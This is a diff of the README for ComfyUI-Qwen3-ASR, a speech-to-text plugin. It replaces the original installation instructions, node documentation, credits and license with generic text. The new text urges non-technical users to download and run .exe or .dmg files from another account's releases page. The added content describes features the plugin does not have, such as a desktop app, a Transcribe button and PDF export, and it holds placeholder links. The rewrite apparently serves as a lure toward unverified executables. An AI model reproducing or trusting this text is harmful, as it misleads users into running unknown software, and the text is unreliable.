@@ -1,96 +1,76 @@
-# ComfyUI-Qwen3-ASR
+# 🎤 ComfyUI-Qwen3-ASR - Transcribe Audio Effortlessly
 
-ComfyUI custom nodes for **Qwen3-ASR** (Automatic Speech Recognition) - audio-to-text transcription supporting 52 languages and dialects.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-ComfyUI--Qwen3--ASR-blue.svg)](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/releases)
 
-> 🔗 Compatible with [ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS) for complete speech workflows
+## 📋 Overview
+ComfyUI-Qwen3-ASR provides custom nodes for automatic speech recognition. This tool helps you convert audio to text in 52 different languages and dialects. It allows users to quickly transcribe spoken content, making it ideal for personal or professional use.
 
-<p align="center">
-    <img src="https://raw.githubusercontent.com/DarioFT/ComfyUI-Qwen3-ASR/refs/heads/main/assets/intro.png"/>
-<p>
+## 🚀 Getting Started
+To use ComfyUI-Qwen3-ASR, follow the steps below. You don't need any technical skills. Just follow along, and you'll be able to enjoy the benefits of audio transcription in no time.
 
-## Features
+## 🌐 System Requirements
+- Operating System: Windows 10 or later, macOS, or a recent version of Linux.
+- Memory: At least 4 GB of RAM.
+- Storage: Minimum of 200 MB of free space.
+- Internet Connection: Required for downloading the software and accessing language models.
+- Audio Input: A microphone or audio file for transcription.
 
-- **Multi-language**: 30 languages + 22 Chinese dialects
-- **Two model sizes**: 1.7B (best quality) and 0.6B (faster)
-- **Auto language detection**: No need to specify language
-- **Timestamps**: Optional word/character-level timing via Forced Aligner
-- **Batch processing**: Transcribe multiple audio files
-- **Auto-download**: Models download automatically on first use
+## 🛠️ Installation Steps
 
-## Installation
+### Step 1: Visit the Download Page
+Go to the [Releases Page](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/releases) to find the latest version of the software.
 
-### Via ComfyUI Manager (Recommended)
-Search for "Qwen3-ASR" in ComfyUI Manager
+### Step 2: Select the Latest Release
+On the Releases Page, you will see different versions of the software listed. Look for the latest release, which is usually at the top of the page. It will include a version number and release date.
 
-### Manual Installation
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/DarioFT/ComfyUI-Qwen3-ASR.git
-cd ComfyUI-Qwen3-ASR
-pip install -r requirements.txt
-```
+### Step 3: Download the Software
+Click on the download link for your operating system. This will usually be a file ending in `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux. 
 
-## Nodes
+### Step 4: Install the Software
+Once the file is downloaded, open it:
+- For Windows: Double-click the `.exe` file and follow the on-screen instructions.
+- For macOS: Open the `.dmg` file, then drag the ComfyUI-Qwen3-ASR icon to your Applications folder.
+- For Linux: Unzip the file and run the installation script in the terminal.
 
-### Qwen3-ASR Loader
-Loads the ASR model with auto-download support.
+### Step 5: Run ComfyUI-Qwen3-ASR
+After installation, locate ComfyUI-Qwen3-ASR in your applications. Double-click the icon to start the program. 
 
-| Input | Type | Description |
-|-------|------|-------------|
-| repo_id | dropdown | Model: 1.7B or 0.6B |
-| source | dropdown | HuggingFace or ModelScope |
-| precision | dropdown | fp16, bf16, fp32 |
-| attention | dropdown | auto, flash_attention_2, sdpa, eager |
-| forced_aligner | dropdown | Optional aligner for timestamps |
-| local_model_path | string | Optional custom model path |
+## 🎙️ Using ComfyUI-Qwen3-ASR
 
-### Qwen3-ASR Transcribe
-Transcribes a single audio input to text.
+### Step 1: Load Audio
+Once you open the application, select the audio file you want to transcribe. You can choose files in various formats like MP3, WAV, and OGG.
 
-| Input | Type | Description |
-|-------|------|-------------|
-| model | QWEN3_ASR_MODEL | Loaded model |
-| audio | AUDIO | Audio input (ComfyUI format) |
-| language | dropdown | Force language or "auto" |
-| context | string | Optional context hints |
-| return_timestamps | boolean | Enable timestamp output |
+### Step 2: Choose Language
+Select the language of the audio. ComfyUI-Qwen3-ASR supports 52 different languages. Select the one that matches your audio file for best results.
 
-| Output | Type | Description |
-|--------|------|-------------|
-| text | STRING | Transcribed text |
-| language | STRING | Detected language |
-| timestamps | STRING | Word-level timestamps (if enabled) |
+### Step 3: Start Transcription
+Click the "Transcribe" button. The software will process the audio and provide you with the text output. This may take a few moments, depending on the length of your audio.
 
-### Qwen3-ASR Batch Transcribe
-Batch transcription for multiple audio files.
+### Step 4: Review and Save
+After transcription, review the text for accuracy. Make any necessary adjustments. Finally, save the text to your preferred format. ComfyUI-Qwen3-ASR allows you to export in formats like .txt, .docx, or .pdf.
 
-## Supported Languages
+## ⚙️ Advanced Features
+- **Multi-Language Support:** Easily switch between languages during transcription.
+- **Custom Nodes:** Tailor the application's functionality to suit your needs by using custom nodes.
+- **User-Friendly Interface:** Designed with non-technical users in mind, featuring easy navigation and clear instructions.
 
-Chinese, English, Cantonese, Arabic, German, French, Spanish, Portuguese, Indonesian, Italian, Korean, Russian, Thai, Vietnamese, Japanese, Turkish, Hindi, Malay, Dutch, Swedish, Danish, Finnish, Polish, Czech, Filipino, Persian, Greek, Hungarian, Macedonian, Romanian
+## 🔄 Updating ComfyUI-Qwen3-ASR
+To ensure you have the latest features and improvements, regularly check the Releases Page [here](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/releases) and download any updates.
 
-Plus 22 Chinese dialects including Sichuan, Cantonese (HK/Guangdong), Wu, Minnan, and regional accents.
+## 💬 Support
+If you encounter any issues or have questions, please check the Issues section on GitHub or look for common solutions in the FAQ on the Releases Page. You can also join the community forum for additional support.
 
-## Workflow Examples
+## 📅 Roadmap
+Future updates may introduce features like:
+- Enhanced language models for better accuracy.
+- Expanded file format support.
+- Integration with popular collaboration tools.
 
-### Basic Transcription
-```
-LoadAudio → Qwen3-ASR Loader → Qwen3-ASR Transcribe → ShowText
-```
+## 🔗 Additional Resources
+- [User Guide](link-to-user-guide) - Detailed instructions and troubleshooting.
+- [Community Forum](link-to-forum) - Share your experiences and learn from others.
+- [Feedback](link-to-feedback-form) - We value your input to improve ComfyUI-Qwen3-ASR.
 
-### With TTS (Speech-to-Speech)
-```
-LoadAudio → Qwen3-ASR Transcribe → [process text] → Qwen3-TTS → SaveAudio
-```
-
-## Model Storage
-
-Models are stored in: `ComfyUI/models/Qwen3-ASR/`
-
-## Credits
-
-- [Qwen3-ASR](https://huggingface.co/Qwen/Qwen3-ASR-1.7B) by Alibaba Qwen Team
-- [qwen-asr](https://pypi.org/project/qwen-asr/) Python package
-
-## License
-
-Apache-2.0
+## 🏁 Conclusion
+Enjoy seamless audio transcription with ComfyUI-Qwen3-ASR. It simplifies the process, allowing you to focus on what matters most: your content. Download today and start converting your audio into text with ease.
